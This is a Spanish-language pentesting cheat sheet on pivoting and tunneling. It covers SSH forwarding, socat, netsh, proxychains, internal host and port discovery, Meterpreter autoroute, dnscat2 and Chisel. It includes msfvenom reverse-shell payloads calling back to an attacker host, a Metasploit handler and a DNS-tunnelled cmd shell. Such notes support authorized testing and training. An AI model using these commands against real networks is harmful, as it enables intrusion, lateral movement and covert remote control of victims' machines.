#pivoting #tunneling #port-forwarding #lateral-movement
## Port forwarding
NOTA: Si hemos accedido a través de una `revshell` simple a la máquina sobre la que pilotamos, deberemos actualizar a una tty para poder introducir la contraseña de ssh por prompt
### SSH - Linux
#### Local port forwarding
##### Para parecer que el tráfico proviene de localhost 
Es útil para acceder a servicios locales en una máquina remota como si estuvieran en nuestra máquina local. En este caso `$target` debe tener un servidor ssh. Supongamos que queremos conectarnos a MySQL desde `$pwnbox` a un servidor MySQL que solo acepta conexiones locales
- Hacemos que nuestra `$pwnbox` esté en escucha en el puerto `1234` y redirija el tráfico al puerto 3306 de `$target`. Desde `$pwnbox` : 
	```bash
	ssh -NfL 1234:localhost:3306 $username@$target
	```
- Desde `$pwnbox`  escribimos
```bash
mysql -h 127.0.0.1 -P 1234 -u root -p
# mysql -h localhost -P 1234 -u root -p # -> Podría no funcionar
```
Bajo la perspectiva de `$target` el tráfico parece provenir de `localhost`
##### Conectar desde `$pwnbox` a `$target` a través de `$pivot`
Tenemos aceso a `$pivot` y no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`.  Supongamos que queremos conectarnos vía  RDP  a `$target`
- Hacemos que nuestra pwnbox esté en escucha en el puerto 33389 y redirija el tráfico al puerto 3389 de `$target`. Desde `$pwnbox`
	```bash
	# Escucha solo en localhost. Solo la máquina que ejecuta el comando puede acceder al puerto 33389
	ssh -NfL 33389:$target:3389 user_on_pivot@$pivot
	```
- En nuestra  `$pwnbox`: 
	```bash
	xfreerdp /v:localhost /u:username_on_target /p:password_on_target /port:33389
	```
Desde la perspectiva de **`$target`**, el tráfico parece provenir de **`$pivot`**, cumpliendo cualquier restricción que limite las conexiones RDP al origen `$pivot`.
##### Conectar desde `$pwnbox` a `$target`: desde `$pwned` a través de `$pivot`
Escenario en el que desde `$pwnbox` tenemos una máquina comprometida, `$pwned`, que tiene acceso a `$pivot` vía ssh  y `$pivot` a su vez tiene visibilidad con `$target`. Supongamos que nos queremos conectar a un servidor SMB de `$target` desde `$pwnbox`
- Hacemos que `$pwned` esté en escucha en el puerto `4445`, redirigiendo todo el tráfico al puerto 445 de `$target`. Desde `$pwned`
	```bash
	# Escucha en todas las interfaces. Cualquier máquina puede acceder a 4445
	ssh -NfL 0.0.0.0:4445:$target:445 user_on_pivot@$pivot
	```
- Desde `$pwnbox`
	```bash
	smbclient -p 4455 //$pwned/info -U hr_admin --password=Welcome1234
	```

#### Dynamic Port Forwarding
Crea un túnel SOCKS (proxy) en el puerto especificado. Cuando se ejecute una herramienta sobre proxychains, para `$target` será como si la conexión fuera de `$pivot`
```bash
# Si lo hacemos desde nuestra pwnbox. Solo nuestra máquina puede conectarse al puerto 9050
ssh -NfD 9050 ubuntu@$pivot
# El siguiente comando permite que cualquier máquina se conecte al puerto 9050. Si lo hacemos desde $pwned
ssh -NfD 0.0.0.0:9050 ubuntu@$pivot
# IMPORTANTE. Después de esto /etc/proxychains4.conf de $pwnbox tener la siguiente configuración:
socks5 $pwned 9050
```
#### Remote port forwarding
##### `$target` se comunica con `$pwnbox` a través de `$pivot`
Tenemos aceso a `$pivot` y no tenemos acceso a `$target` desde nuestra pwnbox, pero sí desde `$pivot`. En este caso queremos que `$target` se comunique con `$pwnbox`. Supongamos que queremos que `$target` envíe una revshell a `$pwnbox`
- En este caso se pone en escucha el servidor ssh, `$pivot` en el puerto 44444, redirigiendo todo el tráfico al puerto 4444 de `$pwnbox`. Desde `$pwnbox`: 
	```bash
	# En pivot el tráfico 8080 solo estaría accesible localmente
	 ssh -R 44444:localhost:4444 username@$pivot -vN
	```
- Creamos un exploit en nuestra `$pwnbox` 
	```bash
	#Ejemplo meterpreter linux:
	 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=44444
	# Ejemplo revshell para nc en linux:
	msfvenom -p linux/x64/shell_reverse_tcp lhost=$pivot -f elf -o revshell.exe LPORT=44444
	```
- Nos ponemos en escucha en `$pwnbox`
	```bash
	nc -nvlp 4444
	```
- Ejecutamos el exploit en `$target`
	```
	./revshell.exe
	```

- El archivo de configuración `/etc/ssh/sshd_config` debe tener el valor;
	```bash
	GatewayPorts yes
	```
- Si se ha cambiado el valor, hay que reiniciar el servicio 
	```bash
	sudo systemctl restart ssh
	```
##### `$target` se comunica con `$pwnbox`: desde `$pwned` a través de `$pivot`
Escenario en el que desde `$pwnbox` tenemos una máquina comprometida, `$pwned`, que tiene acceso a `$pivot` vía ssh  y `$pivot` a su vez tiene visibilidad con `$target`. Queremos que `$target` se comunique con `$pwnbox`. Supongamos que queremos descargar un archivo que está servido en el puerto 8000 de nuestra `$pwnbox`
- Hacemos que esté en escucha `$pivot` en el puerto 8888, redirigiendo todo el tráfico a el puerto 8000 de nuestra pwnbox. Desde `$pwned`
	```bash
	ssh -R 0.0.0.0:8888:localhost:8000 username@$pivot -vN
	```
- Desde `$target`
	```bash
	wget http://$pivot:8888/recurso
	```
##### Solo se permite tráfico saliente en la red atacada
Si la red a la que queremos acceder tiene un cortafuegos que no permite tráfico entrante, pero sí saliente. Supongamos que desde nuestra máquina `$pwnbox` queremos acceder al puerto 5432 de `$target` y tenemos una máquina comprometida, `$pwned` (notar que aquí en realidad no hace falta ningún pivote)
- Nuestra `$pwnbox` debe tener activado el servicio ssh
	```bash
	sudo systemctl start ssh
	```
- Desde `$pwned` hacemos que `$pwnbox` esté en escucha en el puerto 2345, redirigiendo todo el tráfico al puerto 5432 de `$target`
	```bash
	ssh -N -R 127.0.0.1:2345:10.4.153.215:5432 an0nio@$pwnbox
	```
- Desde `$target`: 
	```bash
	psql -h 127.0.0.1 -p 2345 -U postgres
	```
#### Remote dynamic Port Forwarding
 La que queremos acceder tiene un cortafuegos que no permite tráfico entrante, pero sí saliente. Supongamos que queremos ejecutar nmap en `$target` desde `$pwnbox`
- Debemos tener activado el servicio ssh en nuestra `$pwnbox`
	```bash
	service ssh start
	```
- Desde `$pwned` hacemos que `$pwnbox` cree un túnel proxy socks en el puerto 9998
	```
	ssh -N -R 9998 an0nio@192.168.45.216
	```
- En la configuración de `/etc/proxychains4.conf` debe haber lo siguiente:
	```bash
	socks5 127.0.0.1 9998
	```
- Desde `$pwnbox`
	```bash
	proxychains nmap -vvv -Pn -sT --top-ports=100 $target -oN ports_$target  
	```
		

### Windows
#### Solo cliente ssh
- Si no tenemos un servidor ssh, pero sí un cliente ssh, podemos utilizar de forma natural remote dynamic port forwarding 
- Comprobamos que tenemos ssh -> Desde CMD (no funciona en powershsell)
	```powershell
	where ssh
	```
- En nuestra pwnbox activamos el servidor ssh 
	```bash
	service ssh start
	```
- En la máquina comprometida escribimos
	```powershell
	ssh -N -R 9998 an0nio@192.168.45.216
	```
- Nos aseguramos que tenemos la siguiente información en `/etc/proxychains4.conf`
	```bash
	socks5 127.0.0.1 9998
	```
- Y tenemos un túnel socks creado con el que podemos utilizar proxychains con normalidad
#### `plink`
Algunas versiones de Windows **no tienen cliente SSH instalado de forma nativa**, por lo que es necesario utilizar una herramienta alternativa como **`plink`** (de **PuTTY**). Solo permite remote port forwarding
- Ubicación en pwnbox
	```bash
	/usr/share/windows-resources/binaries/plink.exe
	```
- Funcionamiento general
```powershell
cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
```
- Pone nuestra `$pwnbox` en escucha en el puerto `9833` y redirige todo el tráfico a localhost de `$target` (que está `$pwned`)
	```powershell
	C:\Windows\Temp\plink.exe -ssh -l an0nio -pw 1234 -R 127.0.0.1:9833:127.0.0.1:3389 $target
	```

### Socat - Linux - static port forwarding
#### Funcionamiento general
Aunque puede desempeñar otras funciones otras funciones, nos centraremos en su uso para redirigir el tráfico entre host o redes. Es útil para máquinas intermedias de pivote
```bash
socat [OPCIÓN1] [OPCIÓN2]
```
- **OPCIÓN1**: Punto de origen (como un socket, archivo, puerto).
- **OPCIÓN2**: Punto de destino.
#### Ejemplo revshell
Se redirige el tráfico del puerto `8080` de la máquina pivote al `80` de nuestra máquina atacante 
```bash
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
`fork` en este caso permite atender múltiples clientes de manera simultánea
#### Ejemplo bindshell
En el ejemplo de una bindshell, la máquina víctima está escuchando (puerto `8443` en este ejemplo), por lo que tenemos que hacer llegar la conexión desde nuestra máquina atacante
```shell-session
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
### `netsh` - Windows - Static port forwarding
Nos sirve para pivotar si tenemos acceso a al máquina, aunque es menos potente y flexible que `socat` (no hay cifrado, solo redirige solo tráfico tcp, ...). Podemos hacer redirección del tráfico utilizando el módulo `portproxy`
#### Funcionamiento general
```powershell
netsh interface portproxy add v4tov4 listenport=<puerto_local> listenaddress=<IP_local> connectport=<puerto_destino> connectaddress=<IP_destino>
```
##### Ejemplo ssh
Tráfico del puerto `2222` de la máquina `$pwned` se redirige a el `22` de  `$target`
```powershell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=0.0.0.0 connectport=22 connectaddress=$target
```
La máquina quedaría en escucha, pero no funcionaría si hay reglas de firewall que se aplican
#### Crear reglas de firewall firewall
Supongamos que en el ejemplo en el que redirigimos el puerto 2222 de `$pwned` no tenemos acceso de forma externa. Debemos crear una regla que permita el tráfico desde fuera al puerto 2222
```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=$pwnbox localport=2222 action=allow
```
Eliminar la regla una vez creada: 
```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
#### Comprobar port forward
```powershell
netsh interface portproxy show v4tov4
```
#### Eliminar reglas
```powershell
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```
## Proxychains
Proxychains es una herramienta que puede interceptar las llamadas al sistema de red (`syscalls`) y redirigirlas a través de un proxy (SOCKS o HTTP) configurado en su archivo de configuración
#### Configuración - `/etc/proxychains4.conf`
Para que funcione correctamente con la configuración puesta anteriormente de dynamic port forwarding, la última línea de proxychains debe tener el siguiente contenido (en función de nuestros intereses) 
```textplain
socks5 	127.0.0.1 9050
```
### nmap sobre proxychains
Siempre que se realice un escaner sobre proxychains, este debe ser un escaner de tipo `full TCP connect scan` (proxychains no entiende paquetes parciales). Teniendo esto en cuenta: 
#### Descubrir hosts
Esta opción evita escaneos de tipo `ICMP` que no es válido sobre proxychains. Recordar que `ICMP` pertenece a la capa de red y proxycahins maneja tráfico basado en transporte, como `TCP`
```bash
proxychains nmap -v -sn -PS -PA $10.10.10.1-200
```
## Comandos de descubrimineto sobre máquina comprometida
### Ping sweep desde la máquina comprometida
Si el firewall permite conexiones ICMP desde la máquina comprometida podemos ejecutar lo siguiente para descubrir
- Máquinas linux: 
	```bash
	# Redes tipo /24
	for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
	# Redes tipo /16
	for j in {0..255}; do for i in {1..254}; do (ping -c 1 172.16.$j.$i | grep "bytes from" &) ; done; wait; done

	```
- CMD
	```powershell
	# redes tipo /24
	for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
	#mostrando solo objetivos con conexión:
	for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.5.%i | find "Reply" >nul && echo 172.16.5.%i
	# redes tipo /16
	for /L %j in (0,1,255) do for /L %i in (1,1,254) do ping 172.16.%j.%i -n 1 -w 100 | find "Reply"
	#mostrando solo objetivos con conexión
	for /L %j in (0,1,255) do @for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.%j.%i | find "Reply" >nul && echo 172.16.%j.%i
	```
- Powershell
	```powershell
	# Redes tipo /24 - Mostrando cada objetivo
	1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
	# mostrando solo objetivos con conexión
	1..254 | % { if (Test-Connection -Count 1 -Comp 172.16.5.$_ -Quiet) { "172.16.5.$_" } }

	# Redes tipo /16
	0..255 | % { 1..254 | % {"172.16.$($_).$_: $(Test-Connection -count 1 -comp 172.16.$($_).$_ -quiet)"} }	
	# mostrando solo objetivos conectados
	0..255 | % { 1..254 | % { $ip="172.16.$_.$_"; if (Test-Connection -Count 1 -Comp $ip -Quiet) { $ip } } }

	```
### Descubrir puertos
#### nmap sobre proxychains
Opción segura
```bash
proxychains nmap -v -Pn -sT $target
```
Opción algo más rápida y en principio fiable:
```bash
proxychains nmap -v -Pn -sT --max-rate 1000 --min-parallelism 10 -p 1-1000 $target
```
#### LInux
- Con `/dev/tcp` y `timeout` (fuerza a que no se quede colgado en cada intento de conexión)
	```bash
	for port in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/$target/$port" 2>/dev/null && echo "Puerto $port abierto"; done
	```
- Con `nc`
	```bash
	for port in {1..65535}; do nc -nvv -w 1 -z $target $port 2>&1 | grep succeeded; done
	```

####  powershell
Podemos encontrar listas con los puertos más comunes [aquí](https://gist.github.com/cihanmehmet/2e383215ea83e08d01478446feac36d8#top-1000-tcp-ports-1)
```powershell
$target = "172.16.5.25"
# Debemos tener un archivo sparado por líneas con los puerto más comunes
$ports = Get-Content "ports.txt"

$ports | % { try { $tcpClient = New-Object Net.Sockets.TcpClient; if ($tcpClient.ConnectAsync($target, $_).Wait(200)) { $tcpClient.Close(); "Port $_ is open" } } catch {} }
```
## Meterpreter
### Conectar a máquina pivote
Suponiendo un escenario en el que la máquina pivote es una máquina linux podemos hacer lo siguiente: 
- Crear un payload para la máquina pivote
	```bash
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
	```
- Configurar y empezar con el handler
	```bash
	msfconsole
	msf6 > use exploit/multi/handler
	msf6 > set lport 8080
	msf6 > set lhost 0.0.0.0
	msf6 > set payload linux/x64/meterpreter/reverse_tcp
	msf6 > run	
	```
- Ejecutar el payload en la máquina pivote
	```bash
	chmod +x backupjob
	./backupjob
	```
### Ping sweep
```bash
meterpreter > use post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
### Configurar proxy SOCKS
```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
# podemos comprobar que el proxy está corriendo escribiendo 
msf6 auxiliary(server/socks_proxy) > jobs
```
Después de esto, habría que comprobar que tenemos la siguiente línea en `/etc/proxychains.conf`
```bash
socks4 127.0.0.1 9050
```
(Según la versión del socks habría que poner `socks5` en lugar de `socks4`)
### Crear rutas con `autoroute`
La configuración solo tendrá efecto dentro del propio `metasploit`
#### Desde msfconsole con sesión
```bash
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
#### Desde meterpreter
```bash
meterpreter > run autoroute 172.16.0.5/23
```
#### Listar rutas activas
```bash
meterpreter > run autoroute -p
```
### Port forwarding
#### Local port forwarding
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
`-l` listener, `-r` remote, `-p` port
#### Remote port forwarding
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Redirige el tráfico del puerto `1234` de la máquina víctima al puerto `8081` de nuestra pwnbox
## Dnscat2
**`dnscat2`** es una herramienta de **comunicación a través del protocolo DNS**, diseñada para crear túneles y canales de comunicación en situaciones en las que otros protocolos de red están bloqueados. Envía datos a través de consultas de subdominios DNS e infiltra datos con registros TXT y otros. 
Vemos un ejemplo de cómo ejecutar una revshell con este protocolo
### Servidor - máquina atacante
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
Esto proporciona una clave privada que hay que proporcionar al cliente
### Cliente - máquina pivote - Ejemplo `dnscat.ps1`
Tras descargar el archivo en la máquina pivote ejecutamos lo siguiente
```powershell
PS > Import-Module .\dnscat2.ps1
PS > Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -preSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
# Si todo va bien aparecerá el siguiente mensaje: 
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
# Podemos listar opciones con 
?
# Podemos interactuar con la sesión escribiendo 
window -i 1
```
## Chisel
Herramienta escrita en go que permite crear túneles TCP/UDP entre sistemas
### Modo servidor
Se ejecuta en la `pwnbox`
```bash
./chisel server -p 8000 --reverse -v
```
### Modo cliente
#### Redirección de un puerto 
Ejecutar este comando en la máquina pivote redirigiría el puerto `8001` de nuestra máquina (`localhost`) al puerto `80` de `172.16.5.1`
```bash
./chisel client 10.10.14.114:8000 R:8001:172.16.5.1:80 -v 
# Significado: 
R:<listen_host>:<listen_port>:<target_host>:<target_port>
```
Puede ser un poco más seguro para nosotros como atacantes escribir:
```bash
./chisel client 10.10.14.114:8000 R:127.0.0.1:8001:172.16.5.1:80 -v 
```
ya que sólo expondría el puerto 8001 en localhost
##### Comportamiento `R:::` en otros escenarios

|**Comando**|**Resultado**|
|---|---|
|`R:8080:127.0.0.1:80`|El atacante escucha en **8080** y reenvía tráfico al **puerto 80 en la víctima**.|
|`R::8080:127.0.0.1:80`|**El atacante escucha en todas las interfaces (`0.0.0.0:8080`)** y reenvía a **80 en la víctima**.|
|`R:::80`|**Igual que arriba, pero el puerto atacante también es 80**.|
|`R::::3306`|**El atacante escucha en `3306` y reenvía a `127.0.0.1:3306` en la víctima**.|
#### Redirección socks
El siguiente comando hace que el servidor esté escuchando en el puerto `1080`
```bash
./chisel client 10.10.14.114:8000 R:socks
```
por lo que habría que añadir a `/etc/proychains.conf`
```
socks5 127.0.0.1 1080
```
### Versión a elegir de chisel
#### Linux

| Salida de `uname -m` | Arquitectura                | Archivo Chisel                        |
|----------------------|---------------------------|--------------------------------------|
| x86_64             | Linux 64-bit (AMD/Intel)   | chisel_1.10.0_linux_amd64.gz       |
| i686               | Linux 32-bit (AMD/Intel)   | chisel_1.10.0_linux_386.gz         |
| i386               | Linux 32-bit (AMD/Intel)   | chisel_1.10.0_linux_386.gz         |
| armv7l             | Linux ARM 32-bit           | chisel_1.10.0_linux_arm.gz         |
| aarch64            | Linux ARM 64-bit           | chisel_1.10.0_linux_arm64.gz       |
| arm64              | Linux ARM 64-bit           | chisel_1.10.0_linux_arm64.gz       |
| mips               | Linux MIPS                 | chisel_1.10.0_linux_mips.gz        |
#### Windows
| Versión de Windows | Comando para verificar       | Archivo Chisel                 |
| ------------------ | ---------------------------- | ------------------------------ |
| Windows 64-bit     | `wmic os get osarchitecture` | chisel_1.10.0_windows_amd64.gz |
| Windows 32-bit     | `wmic os get osarchitecture` | chisel_1.10.0_windows_386.gz   |


---
## Dato curioso
Para conectarme a una máquina `$target` a través de una máquina `$pivot` sí puedo con `ssh -D` , pero no con `ssh -L` . Explicación: 
- No es posible conectarse desde `$pivot` a `$target` por `ssh` (la máquina `$pivot` tiene opciones no compatibles con la versión del cliente SSH : El servidor tiene configurado `Use PAM no` en `/etc/ssh/ssh_config` ). Al intentar una conexión con un túnel, de tipo `ssh -L` hacia `$target` desde nuestra pwnbox, se está usando la configuración y credenciales disponibles en `$pivot` (incluído `Use PAM no` )
- Al conectarse por `ssh -D` , las configuraciones de la conexión dependen de nuestra pwnbox, que tiene configurado `Use PAM yes` en `/etc/ssh/ssh_config`
